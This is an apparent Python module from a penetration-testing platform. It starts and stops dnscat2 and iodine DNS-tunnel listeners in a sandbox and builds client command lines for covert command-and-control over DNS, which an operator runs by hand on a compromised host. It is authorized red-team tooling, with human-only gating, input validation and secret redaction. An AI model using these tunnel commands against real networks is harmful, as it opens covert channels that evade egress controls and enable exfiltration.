"""DNS-tunnel obfuscation — HUMAN-ONLY listener lifecycle (dnscat2 / iodine).

A DNS tunnel is the standard test of whether a network's egress controls and DNS analytics
actually catch a covert channel: the client talks only to the host's configured resolver, so
it reaches the operator's authoritative server through the target's OWN DNS infrastructure
without ever opening a direct outbound connection at all. dnscat2 does encrypted C2 over DNS
(T1071.004);
iodine brings up a whole IP-over-DNS interface (T1572) and is far louder.

A tunnel has TWO halves and they carry completely different risk. THIS MODULE OWNS EXACTLY
ONE OF THEM:

THE LISTENER (server) half — :func:`start_listener` / :func:`stop_listener` /
    :func:`list_listeners`. *** HUMAN-ONLY. *** This is OPERATOR INFRASTRUCTURE: the
    authoritative server for a zone the OPERATOR controls and has had delegated, running on
    the OPERATOR's own sandbox. It has no target, it touches nothing belonging to the client,
    and starting it is not an action against a system under test — so there is no gate beyond
    "a human clicked Start". That is exactly the posture ``cockpit/tunnels.py`` gives a pivot
    listener and ``cockpit/sliver.py`` gives a C2 server, and this mirrors them structurally:
    a hardcoded container, a liveness probe, a live cap, a tracked process, a refusal that
    runs nothing, every start and stop recorded.

    Deliberately NOT the gated-generation pattern. There is no ``executor.validate_request``
    here and no red-confirm, because there is nothing to gate: no target, no argument aimed at
    anyone's network. What makes it safe is the same thing that makes the pivot listener safe
    — THE AUTONOMOUS PATH HAS ZERO ROUTE HERE. A covert channel an agent could raise is an
    autonomous covert channel. Regression-locked by a source scan over the whole backend tree
    (test_obfuscation.py::test_obfuscation_surface_is_human_only), the same lock ``:kali``,
    the tunnels, live sessions and Sliver have.

*** THE CLIENT half — :func:`operator_oneliner`. IT IS NEVER DELIVERED. ***
    The client runs on the FAR SIDE: a host the operator already has execution on. HackPit
    cannot reach a machine it has not compromised, and it must not try — so this function
    RETURNS A STRING and stops. The operator carries it across by hand (into ``:kali``, the
    live-session panel, a web shell), each of those being its own separately-approved step.
    Nothing in this module ships, drops, pipes or executes that string: there is no
    file-copy path into a container, no stdin pipe, no HTTP client, no SSH/SMB anywhere in
    the file, and the function is PURE — string construction only, no I/O, no clock, no subprocess. That is the
    same boundary ``tunnels.py`` draws around its agent one-liner, and it is the load-bearing
    property of this module.

THE ZONE AND THE TUNNEL NET ARE OPERATOR-OWNED, NEVER THE TARGET.
    ``zone`` is a DNS zone the operator controls and has had delegated to their own server;
    ``tunnel_net`` is the tunnel interface's own private address/netmask. Neither has anything
    to do with the system under test, and neither is ever substituted with the engagement
    target — pointing a tunnel at the client's own zone would be both useless and harmful.
    They are spelled ``<tunnel-zone>`` / ``<tunnel-net>`` in the tool catalog precisely so the
    composer's target-substitution pass cannot rewrite them (``<domain>`` and any ``<tun-ip>``
    spelling would be).

CONTAINMENT, the rest of it:
    * argv LISTS only, handed to subprocess as a list. Never a shell string, so no request
      value can ever reach a shell.
    * The container is a CODE CONSTANT (``config.ENGAGE_SANDBOX_CONTAINER``) — never a
      request field. :class:`ObfuscationRequest` has no container/sandbox field at all.
    * ``kind`` comes from a FIXED SET and ``zone`` / ``secret`` are pattern-bounded and may
      not start with ``-``, so nothing caller-supplied can be read as a flag.
    * Every start and stop is recorded via ``runstore.save_run``, with the operator's
      pre-shared tunnel password REDACTED — the audit trail must not become a key store.

The far-side client connect-back is inherently untestable without a real compromised host;
the listener lifecycle, the argv and the one-liner are built and unit-tested, and the actual
connect-back is the operator's manual step, exactly like the pivot tunnels' agent line.
"""

from __future__ import annotations

import ipaddress
import os as _os
import re
import subprocess
import threading
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any

from pydantic import BaseModel, Field, field_validator, model_validator

from . import config, runstore
from .models import RunRecord

# The binaries, as spelled in the tool catalog (backend/arsenal/tools.json). Constants, never
# request fields — the same discipline the container names get.
#
# ASSUMPTION, to be confirmed by the image-build task: upstream dnscat2 ships a ``dnscat2``
# client and a Ruby ``dnscat2.rb`` server, while Kali packaging tends to supply hyphenated
# wrappers. We follow the catalog's spelling; if the image lands different names, change them
# HERE (one place) — nothing else in the codebase spells them.
DNSCAT2_SERVER_BIN = "dnscat2-server"
DNSCAT2_CLIENT_BIN = "dnscat2-client"
IODINE_SERVER_BIN = "iodined"
IODINE_CLIENT_BIN = "iodine"

KINDS = ("dnscat2", "iodine")

# The tunnel interface's own range. A private range by definition — it belongs to the tunnel,
# not to anybody's network, least of all the engagement's.
DEFAULT_TUNNEL_NET = "10.99.53.1/24"

# Bounds. Both servers bind UDP/53 inside the sandbox, so a second live listener usually needs
# the first stopped; the cap is here to bound accumulation, not to schedule ports.
MAX_LIVE_LISTENERS = int(_os.environ.get("HACKPIT_MAX_DNS_LISTENERS", "2"))

# A zone label: hostname characters (or an angle-bracket placeholder), never leading '-' so it
# cannot be read as a flag, and no whitespace/metacharacters to smuggle in.
_ZONE_RE = re.compile(r"^(?!-)[A-Za-z0-9._<>-]{1,253}$")
# A pre-shared password: anything printable except whitespace, again never leading '-'.
_SECRET_RE = re.compile(r"^(?!-)[!-~]{1,128}$")


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


# --------------------------------------------------------------------------- #
# models
# --------------------------------------------------------------------------- #
class ObfuscationRequest(BaseModel):
    """Start a DNS-tunnel listener. NO container field — the box is a constant.

    There is no target here BY DEFINITION: the server listens on the operator's own sandbox
    for a zone the operator owns, and nothing about starting it reaches a system under test.
    ``engagement_id`` only tags the record so the listener shows up in the right engagement's
    audit trail; it does not gate anything and it cannot redirect where the server runs.
    """

    kind: str = Field("dnscat2", description=f"Tunnel server — one of {KINDS}.")
    zone: str = Field(
        ...,
        min_length=1,
        description="The DNS zone YOU control and have had delegated to this server "
        "(<tunnel-zone>). NEVER the target's zone, and never substituted with the target.",
    )
    tunnel_net: str = Field(
        DEFAULT_TUNNEL_NET,
        description="iodine only: the tunnel interface's OWN private address/netmask "
        "(<tunnel-net>), e.g. 10.99.53.1/24. Unrelated to any engagement range.",
    )
    secret: str | None = Field(
        None,
        description="Pre-shared key/password for the tunnel. Required for iodine (-P); "
        "optional for dnscat2, which prints a generated one if omitted. REDACTED in the "
        "audit record.",
    )
    engagement_id: str | None = Field(
        None, description="Engagement to record this listener against (tagging only — not a gate)."
    )

    @field_validator("kind")
    @classmethod
    def _kind_ok(cls, v: str) -> str:
        v = str(v).strip().lower()
        if v not in KINDS:
            raise ValueError(f"kind must be one of {KINDS}")
        return v

    @field_validator("zone")
    @classmethod
    def _zone_ok(cls, v: str) -> str:
        v = str(v).strip()
        if not _ZONE_RE.match(v):
            raise ValueError(
                "zone must be a bare DNS name (or a <placeholder>) — no whitespace, no shell "
                "metacharacters, and it may not start with '-'"
            )
        return v

    @field_validator("tunnel_net")
    @classmethod
    def _tunnel_net_ok(cls, v: str) -> str:
        v = str(v).strip()
        try:
            iface = ipaddress.ip_interface(v)
        except ValueError:
            raise ValueError("tunnel_net must be an address/netmask, e.g. 10.99.53.1/24")
        if not iface.ip.is_private:
            raise ValueError(
                "tunnel_net is the tunnel interface's OWN range and must be private — a public "
                "range here would point the tunnel at somebody else's network"
            )
        return str(iface)

    @field_validator("secret")
    @classmethod
    def _secret_ok(cls, v: str | None) -> str | None:
        if v is None:
            return None
        v = str(v).strip()
        if not v:
            return None
        if not _SECRET_RE.match(v):
            raise ValueError(
                "secret must be printable with no whitespace and may not start with '-'"
            )
        return v

    @model_validator(mode="after")
    def _iodine_needs_a_secret(self) -> "ObfuscationRequest":
        if self.kind == "iodine" and not self.secret:
            raise ValueError("iodine requires a pre-shared password (-P)")
        return self


class ObfuscationListener(BaseModel):
    """One DNS-tunnel listener this backend started. Operator infrastructure, not a target."""

    id: str
    kind: str
    status: str = Field(description="listening | down.")
    container: str
    zone: str
    tunnel_net: str | None = None
    secret: str | None = Field(
        None,
        description="The operator's own pre-shared key, echoed back so the client one-liner "
        "can be rebuilt. Never written to the audit record.",
    )
    run_id: str
    client_command: str = Field(
        "",
        description="The CLIENT half, for the operator to run BY HAND on the far side. "
        "HackPit never delivers or executes it — see operator_oneliner.",
    )
    setup_note: str = ""
    started_at: str
    stopped_at: str | None = None
    engagement_id: str | None = None


class ObfuscationRefused(RuntimeError):
    """Nothing started / nothing stopped. Carries the reason that refused it."""

    def __init__(self, reason: str, gate: str = "obfuscation"):
        super().__init__(reason)
        self.reason = reason
        self.gate = gate


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #
@dataclass
class _LiveListener:
    model: ObfuscationListener
    record: RunRecord
    proc: "subprocess.Popen[str] | None" = field(default=None)


_listeners: dict[str, _LiveListener] = {}
_lock = threading.Lock()


def _container_running(name: str) -> bool:
    """Liveness probe for a container. Read-only — inspects, never execs into it."""
    try:
        p = subprocess.run(
            ["docker", "inspect", "-f", "{{.State.Running}}", name],
            capture_output=True, text=True, timeout=10.0,
        )
        return p.returncode == 0 and p.stdout.strip() == "true"
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def _save(record: RunRecord) -> None:
    """Persist a run record. Never raises — recording must not break the surface."""
    try:
        runstore.save_run(record)
    except Exception:  # pragma: no cover - persistence is best-effort
        pass


def _redacted(argv: list[str], secret: str | None) -> list[str]:
    """``argv`` with the operator's pre-shared key masked. For the AUDIT RECORD only.

    The real argv is what runs; this is what gets persisted. A run record ends up in the
    engagement report and the runs DB, and neither should become a key store.
    """
    if not secret:
        return list(argv)
    return [t.replace(secret, "***") for t in argv]


# --------------------------------------------------------------------------- #
# argv + the client one-liner — PURE (build strings, run nothing)
# --------------------------------------------------------------------------- #
def _server_args(req: ObfuscationRequest) -> list[str]:
    """The tunnel SERVER argv (binary first) for this request. *** PURE. ***

    A LIST of tokens and nothing else: no execution, no filesystem, no network, no clock — so
    the UI can preview exactly what a start would run before anyone clicks it.
    """
    if req.kind == "dnscat2":
        argv = [DNSCAT2_SERVER_BIN]
        if req.secret:
            argv.append(f"--secret={req.secret}")
        argv.append(req.zone)
        return argv
    # iodine: `iodined -f -c -P <password> <tunnel-net> <tunnel-zone>` (catalog template).
    return [
        IODINE_SERVER_BIN, "-f", "-c",
        "-P", str(req.secret),
        req.tunnel_net,
        req.zone,
    ]


def operator_oneliner(listener: ObfuscationListener) -> str:
    """The CLIENT half, as a STRING for the operator to run BY HAND on the far side.

    *** THIS IS THE BOUNDARY. *** It builds a string and returns it. It does not deliver it,
    write it anywhere, pipe it into anything or execute it — the client runs on a machine
    HackPit has not compromised and must not reach. Carrying the line across is the operator's
    one manual step (``:kali``, the live-session panel, a web shell), and each of those is its
    own separately-approved action. The same posture ``tunnels.py`` takes with its agent line.

    PURE: string construction only — no I/O, no clock, no subprocess, no state. Deterministic
    for a given listener, so the UI may call it freely.
    """
    if listener.kind == "dnscat2":
        parts = [DNSCAT2_CLIENT_BIN]
        if listener.secret:
            parts.append(f"--secret={listener.secret}")
        parts.append(listener.zone)
        return " ".join(parts)
    # iodine: `iodine -f -P <password> <tunnel-zone>` (catalog template). `-r` forces DNS-only.
    return f"{IODINE_CLIENT_BIN} -f -P {listener.secret or '<password>'} {listener.zone}"


def _setup_note(req: ObfuscationRequest) -> str:
    """Operator-facing guidance. PURE."""
    if req.kind == "dnscat2":
        return (
            f"dnscat2 server is up inside {config.ENGAGE_SANDBOX_CONTAINER}, authoritative for "
            f"'{req.zone}' — a zone YOU control and have had delegated to this box. Run the "
            "client line BY HAND on the host you already have execution on; HackPit does not "
            "deliver it. Add `--dns server=<your-ip>` on the client only to test direct-to-"
            "server mode instead of recursion through the target's resolver."
        )
    return (
        f"iodined is up inside {config.ENGAGE_SANDBOX_CONTAINER} for '{req.zone}' with the "
        f"tunnel interface on {req.tunnel_net} (the tunnel's OWN private range, unrelated to "
        "any engagement range). Run the client line BY HAND on the compromised host; HackPit "
        "does not deliver it. Add `-r` on the client to skip the raw-UDP probe and force the "
        "DNS path you actually want tested."
    )


# --------------------------------------------------------------------------- #
# lifecycle — *** HUMAN-ONLY ***. Operator infrastructure, no target.
# --------------------------------------------------------------------------- #
def start_listener(req: ObfuscationRequest) -> ObfuscationListener:
    """Start a DNS-tunnel listener in the ENGAGE sandbox. *** HUMAN-ONLY. ***

    Clicking Start IS the approval: this runs the operator's own authoritative tunnel server
    on the operator's own sandbox, for a zone the operator owns, with no target — so no
    target-scope gate applies (the identical reasoning the pivot-listener and Sliver-server
    lifecycles use). Refuses — running NOTHING — if the sandbox is down, the live cap is hit,
    or the docker CLI is missing.

    Returns the listener with its ``client_command`` filled in. That string is for the human;
    nothing here ships it anywhere. The autonomous path must have NO route to this function;
    see the module docstring.
    """
    if not _container_running(config.ENGAGE_SANDBOX_CONTAINER):
        raise ObfuscationRefused(
            f"engage sandbox '{config.ENGAGE_SANDBOX_CONTAINER}' is not running — bring the "
            "stack up (docker compose -f docker/docker-compose.yml up -d)",
            gate="unavailable",
        )
    with _lock:
        live = sum(1 for l in _listeners.values() if l.model.status == "listening")
        if live >= MAX_LIVE_LISTENERS:
            raise ObfuscationRefused(
                f"too many live DNS-tunnel listeners ({live}/{MAX_LIVE_LISTENERS}) — stop one "
                "first (both servers bind UDP/53)",
                gate="limit",
            )

    lid = uuid.uuid4().hex[:12]
    run_id = uuid.uuid4().hex[:12]
    started_at = _now()
    server_args = _server_args(req)
    argv = ["docker", "exec", config.ENGAGE_SANDBOX_CONTAINER, *server_args]

    try:
        proc = subprocess.Popen(
            argv, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True,
        )
    except FileNotFoundError:
        raise ObfuscationRefused("docker CLI not found on PATH", gate="unavailable")

    model = ObfuscationListener(
        id=lid,
        kind=req.kind,
        status="listening",
        container=config.ENGAGE_SANDBOX_CONTAINER,
        zone=req.zone,
        tunnel_net=req.tunnel_net if req.kind == "iodine" else None,
        secret=req.secret,
        run_id=run_id,
        setup_note=_setup_note(req),
        started_at=started_at,
        engagement_id=req.engagement_id,
    )
    # The one-liner has ONE source of truth, and it is the pure function.
    model.client_command = operator_oneliner(model)

    record = RunRecord(
        run_id=run_id,
        command=server_args[0],
        # REDACTED: the operator's tunnel password must not land in the audit trail.
        args=_redacted(server_args[1:], req.secret),
        # No target BY DEFINITION — this is the operator's own box. Recording the container
        # keeps the audit row honest instead of naming a system under test that was never
        # touched.
        target=config.ENGAGE_SANDBOX_CONTAINER,
        approved=True,  # a human clicked Start; that IS the approval for operator infra
        mode="engagement",
        started_at=started_at,
        session_id=req.engagement_id,
    )
    with _lock:
        _listeners[lid] = _LiveListener(model=model, record=record, proc=proc)
    _save(record)
    return model


def list_listeners() -> list[ObfuscationListener]:
    """Every listener this process knows about, refreshing liveness. Read-only."""
    with _lock:
        live = list(_listeners.values())
    for ll in live:
        if ll.proc is not None and ll.proc.poll() is not None and ll.model.status != "down":
            ll.model.status = "down"
    return [ll.model for ll in live]


def get_listener(lid: str) -> ObfuscationListener | None:
    with _lock:
        ll = _listeners.get(lid)
    return ll.model if ll else None


def stop_listener(lid: str) -> ObfuscationListener:
    """Stop a listener (kill its process). *** HUMAN-ONLY. *** Idempotent.

    Closes the SAME run record the start opened (INSERT OR REPLACE), so the audit trail shows
    one listener with a start and an end rather than two unrelated rows.
    """
    with _lock:
        ll = _listeners.get(lid)
    if ll is None:
        raise ObfuscationRefused(f"no DNS-tunnel listener {lid}", gate="unknown")
    if ll.model.status == "down":
        return ll.model
    if ll.proc is not None:
        try:
            ll.proc.kill()
        except Exception:  # pragma: no cover - already dead
            pass
    ll.model.status = "down"
    ll.model.stopped_at = _now()
    ll.record.finished_at = ll.model.stopped_at
    ll.record.exit_code = ll.proc.poll() if ll.proc is not None else None
    _save(ll.record)
    return ll.model


# --------------------------------------------------------------------------- #
# status + test helper
# --------------------------------------------------------------------------- #
def status() -> dict[str, Any]:
    """Availability + counts for the UI panel. Makes no isolation claim of its own."""
    up = _container_running(config.ENGAGE_SANDBOX_CONTAINER)
    return {
        "container": config.ENGAGE_SANDBOX_CONTAINER,
        "up": up,
        "live_listeners": sum(1 for l in list_listeners() if l.status == "listening"),
        "max_live_listeners": MAX_LIVE_LISTENERS,
        "detail": "" if up else "engage sandbox container is not running",
    }


def reset() -> None:  # test helper
    with _lock:
        for ll in _listeners.values():
            if ll.proc is not None:
                try:
                    ll.proc.kill()
                except Exception:
                    pass
        _listeners.clear()
